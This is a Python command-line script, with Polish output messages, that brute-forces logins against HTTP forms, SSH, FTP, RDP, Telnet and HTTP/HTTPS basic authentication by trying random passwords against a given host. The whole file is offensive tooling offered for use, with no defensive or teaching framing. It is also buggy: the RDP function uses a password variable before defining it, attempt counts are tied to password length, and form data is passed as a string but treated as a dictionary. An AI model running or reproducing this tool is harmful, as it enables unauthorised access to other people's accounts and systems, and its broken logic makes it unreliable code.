import requests
import paramiko
import ftplib
import telnetlib
from rdp import RDPClient
import ssl
import sys
import random
import string

def generate_password(length):
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))

def http_post_form_bruteforce(url, form_data, password_length):
    for _ in range(password_length):
        password = generate_password(password_length)
        form_data['password'] = password
        response = requests.post(url, data=form_data)
        if "Incorrect password" not in response.text:
            print(f"Udało się zalogować! Użyto hasła: {password}")
            return True
        else:
            print(f"Nieudana próba logowania z hasłem: {password}")
    return False

def ssh_bruteforce(hostname, port, username, password_length):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for _ in range(password_length):
        password = generate_password(password_length)
        try:
            client.connect(hostname, port=port, username=username, password=password)
            print(f"Udało się zalogować! Użyto hasła: {password}")
            client.close()
            return True
        except paramiko.AuthenticationException:
            print(f"Nieudana próba logowania z hasłem: {password}")
        except Exception as e:
            print(f"Wystąpił błąd: {e}")

    client.close()
    return False

def ftp_bruteforce(hostname, port, username, password_length):
    for _ in range(password_length):
        password = generate_password(password_length)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, password)
            print(f"Udało się zalogować na FTP! Użyto hasła: {password}")
            ftp.quit()
            return True
        except ftplib.error_perm as e:
            print(f"Nieudana próba logowania na FTP z hasłem: {password}")
        except Exception as e:
            print(f"Wystąpił błąd: {e}")

    return False

def rdp_bruteforce(hostname, port, username, password_length):
    client = RDPClient(hostname, port, username, password)
    for _ in range(password_length):
        password = generate_password(password_length)
        try:
            if client.login():
                print(f"Udało się zalogować przez RDP! Użyto hasła: {password}")
                return True
            else:
                print(f"Nieudana próba logowania przez RDP z hasłem: {password}")
        except Exception as e:
            print(f"Wystąpił błąd: {e}")
            return False

def telnet_bruteforce(hostname, port, username, password_length):
    for _ in range(password_length):
        password = generate_password(password_length)
        try:
            tn = telnetlib.Telnet(hostname, port, timeout=5)
            tn.read_until(b"login: ")
            tn.write(username.encode('ascii') + b"\n")
            tn.read_until(b"Password: ")
            tn.write(password.encode('ascii') + b"\n")
            result = tn.expect([b'Last login:', b'Login failed'], timeout=5)
            if result[0] == 0:
                print(f"Udało się zalogować przez Telnet! Użyto hasła: {password}")
                tn.close()
                return True
            else:
                print(f"Nieudana próba logowania przez Telnet z hasłem: {password}")
                tn.close()
        except Exception as e:
            print(f"Wystąpił błąd: {e}")

    return False

def http_get_bruteforce(url, username, password_length):
    for _ in range(password_length):
        password = generate_password(password_length)
        try:
            response = requests.get(url, auth=(username, password))
            if response.status_code == 200:
                print(f"Udało się zalogować przez HTTP! Użyto hasła: {password}")
                return True
            else:
                print(f"Nieudana próba logowania przez HTTP z hasłem: {password}")
        except Exception as e:
            print(f"Wystąpił błąd: {e}")

    return False

def https_get_bruteforce(url, username, password_length):
    for _ in range(password_length):
        password = generate_password(password_length)
        try:
            response = requests.get(url, auth=(username, password), verify=False)
            if response.status_code == 200:
                print(f"Udało się zalogować przez HTTPS! Użyto hasła: {password}")
                return True
            else:
                print(f"Nieudana próba logowania przez HTTPS z hasłem: {password}")
        except Exception as e:
            print(f"Wystąpił błąd: {e}")

    return False

if __name__ == "__main__":
    if len(sys.argv) <3:
        print("Sposób użycia: python bruteforce.py [metoda] [długość_hasła] [inne argumenty]")
        sys.exit(1)

    method = sys.argv[1]
    password_length = int(sys.argv[2])

    if method == 'http':
        # Obsługa HTTP
        if len(sys.argv) != 5:
            print("Sposób użycia: python bruteforce.py http password_length url form_data")
            sys.exit(1)
        url = sys.argv[3]
        form_data = sys.argv[4]  # Może wymagać parsowania
        success = http_post_form_bruteforce(url, form_data, password_length)
        if not success:
            print("Nie udało się złamać hasła.")
    elif method == 'ssh':
        # Obsługa SSH
        if len(sys.argv) != 6:
            print("Sposób użycia: python bruteforce.py ssh password_length hostname port username")
            sys.exit(1)
        hostname = sys.argv[3]
        port = int(sys.argv[4])
        username = sys.argv[5]
        success = ssh_bruteforce(hostname, port, username, password_length)
        if not success:
            print("Nie udało się złamać hasła.")
    elif method == 'ftp':
        # Obsługa FTP
        if len(sys.argv) != 6:
            print("Sposób użycia: python bruteforce.py ftp password_length hostname port username")
            sys.exit(1)
        hostname = sys.argv[3]
        port = int(sys.argv[4])
        username = sys.argv[5]
        success = ftp_bruteforce(hostname, port, username, password_length)
        if not success:
            print("Nie udało się złamać hasła.")
    elif method == 'rdp':
        # Obsługa RDP
        if len(sys.argv) != 6:
            print("Sposób użycia: python bruteforce.py rdp password_length hostname port username")
            sys.exit(1)
        hostname = sys.argv[3]
        port = int(sys.argv[4])
        username = sys.argv[5]
        success = rdp_bruteforce(hostname, port, username, password_length)
        if not success:
            print("Nie udało się złamać hasła.")
    elif method == 'telnet':
        # Obsługa Telnet
        if len(sys.argv) != 6:
            print("Sposób użycia: python bruteforce.py telnet password_length hostname port username")
            sys.exit(1)
        hostname = sys.argv[3]
        port = int(sys.argv[4])
        username = sys.argv[5]
        success = telnet_bruteforce(hostname, port, username, password_length)
        if not success:
            print("Nie udało się złamać hasła.")
    elif method == 'http-get':
        # Obsługa HTTP (GET)
        if len(sys.argv) != 5:
            print("Sposób użycia: python bruteforce.py http-get password_length url username")
            sys.exit(1)
        url = sys.argv[3]
        username = sys.argv[4]
        success = http_get_bruteforce(url, username, password_length)
        if not success:
            print("Nie udało się złamać hasła.")
    elif method == 'https-get':
        # Obsługa HTTPS (GET)
        if len(sys.argv) != 5:
            print("Sposób użycia: python bruteforce.py https-get password_length url username")
            sys.exit(1)
        url = sys.argv[3]
        username = sys.argv[4]
        success = https_get_bruteforce(url, username, password_length)
        if not success:
            print("Nie udało się złamać hasła.")
